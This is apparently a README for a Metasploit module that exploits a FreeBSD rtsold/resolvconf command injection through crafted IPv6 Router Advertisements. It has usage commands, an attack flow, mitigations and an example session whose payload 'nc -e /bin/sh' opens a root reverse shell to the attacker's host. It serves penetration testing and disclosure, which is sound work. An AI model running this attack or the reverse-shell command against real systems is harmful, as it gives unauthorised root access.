# FreeBSD rtsold/resolvconf Command Injection Exploit Module

## Overview

This Metasploit module exploits a command injection vulnerability in FreeBSD's `rtsold(8)` and `rtsol(8)` programs, as described in FreeBSD Security Advisory FreeBSD-SA-25:12.rtsold.asc.

## Vulnerability Details

- **Affected Software**: FreeBSD rtsold/rtsol programs
- **Vulnerability Type**: Command Injection
- **Impact**: Remote Code Execution with root privileges
- **CVE**: CVE-2025-XXXX (placeholder)
- **Advisory**: https://www.freebsd.org/security/advisories/FreeBSD-SA-25:12.rtsold.asc

### Technical Details

The vulnerability exists because:
1. `rtsold(8)` and `rtsol(8)` process IPv6 Router Advertisement packets for SLAAC
2. They don't validate domain search list options in RA messages
3. The option body is passed to `resolvconf(8)` unmodified
4. `resolvconf(8)` is a shell script that lacks input validation and proper quoting
5. This allows shell command injection through crafted RA packets

## Module Information

- **Module Path**: `modules/exploits/freebsd/rtsold_resolvconf_command_injection.rb`
- **Module Type**: Remote Exploit
- **Rank**: Excellent
- **Platform**: FreeBSD (BSD)
- **Architecture**: x64, x86

## Usage

### Basic Usage

```
use exploit/freebsd/rtsold_resolvconf_command_injection
set RHOST <target_ipv6_address>
set LHOST <your_ip>
set LPORT <your_port>
run
```

### Advanced Usage

```
# Use custom command instead of payload
set COMMAND "touch /tmp/pwned && echo 'exploited' > /tmp/pwned"

# Specify network interface (auto-detected if not set)
set INTERFACE eth0

# Send to IPv6 multicast (all nodes on network segment)
set USE_IPV6_MULTICAST true

# Adjust packet sending parameters
set PACKET_COUNT 10
set PACKET_DELAY 2

run
```

## Options

### Required Options
- **RHOST**: Target IPv6 address (or any address if using multicast mode)

### Optional Options
- **INTERFACE**: Network interface to send packets from (auto-detected)
- **COMMAND**: Custom command to execute (uses payload if not specified)

### Advanced Options
- **PACKET_COUNT**: Number of RA packets to send (default: 5)
- **PACKET_DELAY**: Delay between packets in seconds (default: 1)
- **USE_IPV6_MULTICAST**: Send to all-nodes multicast instead of specific target (default: true)

## Prerequisites

### Target System Requirements
1. FreeBSD system running vulnerable version of rtsold/rtsol
2. IPv6 enabled on network interface
3. System configured to process Router Advertisement packets
4. Vulnerable version of resolvconf (lacks proper input validation)

### Attacker Requirements
1. Network access to target's IPv6 network segment
2. Ability to send raw IPv6 packets (requires root privileges)
3. IPv6 support on attacking system

## Attack Flow

1. Module crafts malicious IPv6 Router Advertisement packets
2. Packets contain DNS Search List options with embedded shell commands
3. Packets are sent to target system (unicast or multicast)
4. Target's rtsold processes the RA packets
5. rtsold passes malicious domain search list to resolvconf
6. resolvconf executes the injected commands with root privileges

## Example Session

```
msf6 > use exploit/freebsd/rtsold_resolvconf_command_injection
msf6 exploit(freebsd/rtsold_resolvconf_command_injection) > set RHOST fe80::1
RHOST => fe80::1
msf6 exploit(freebsd/rtsold_resolvconf_command_injection) > set LHOST 192.168.1.100
LHOST => 192.168.1.100
msf6 exploit(freebsd/rtsold_resolvconf_command_injection) > set LPORT 4444
LPORT => 4444
msf6 exploit(freebsd/rtsold_resolvconf_command_injection) > run

[*] FreeBSD rtsold/resolvconf Command Injection Exploit
[*] ==================================================
[*] Using generated command: nc -e /bin/sh 192.168.1.100 4444 &
[*] Target: fe80::1
[*] Multicast mode: false
[*] Packet count: 5
[*] Packet delay: 1s
[*] Command to execute: nc -e /bin/sh 192.168.1.100 4444 &
[*] 
[*] Crafting malicious IPv6 Router Advertisement packets...
[*] Sending 5 malicious RA packets...
[+] Finished sending RA packets
[+] Malicious RA packets sent successfully!
[*] 
[*] Exploit completed. If successful, the target system should execute:
[*]   nc -e /bin/sh 192.168.1.100 4444 &
[*] 
[*] Prerequisites for successful exploitation:
[*]   1. Target system running FreeBSD with rtsold/rtsol
[*]   2. IPv6 enabled on target interface
[*]   3. Target processing RA packets from this network segment
[*]   4. Vulnerable version of rtsold/resolvconf
[*]   5. Netcat available on target for reverse shell
[*] 
[*] Waiting for reverse connection...
[*] Started reverse TCP handler on 192.168.1.100:4444 
[*] Command shell session 1 opened (192.168.1.100:4444 -> target:12345)

id
uid=0(root) gid=0(wheel) groups=0(wheel)
```

## Limitations

1. **Network Segment**: Attacker must be on same IPv6 network segment as target
2. **IPv6 Requirement**: Target must have IPv6 enabled and configured
3. **rtsold Dependency**: Target must be running rtsold/rtsol for autoconfiguration
4. **Raw Sockets**: Requires root privileges on attacking system for raw socket access
5. **Timing**: Success depends on target processing RA packets in timely manner

## Mitigation

1. Update FreeBSD to patched version
2. Disable rtsold if IPv6 autoconfiguration is not needed
3. Use static IPv6 configuration instead of SLAAC
4. Implement network-level filtering of RA packets
5. Monitor system logs for suspicious resolvconf activity

## References

- [FreeBSD Security Advisory FreeBSD-SA-25:12.rtsold.asc](https://www.freebsd.org/security/advisories/FreeBSD-SA-25:12.rtsold.asc)
- [IPv6 Router Advertisement RFC 4861](https://tools.ietf.org/html/rfc4861)
- [IPv6 DNS Configuration Options RFC 8106](https://tools.ietf.org/html/rfc8106)

## Author

- FreeBSD Security Team (vulnerability discovery)
- MSF Module Author (module implementation)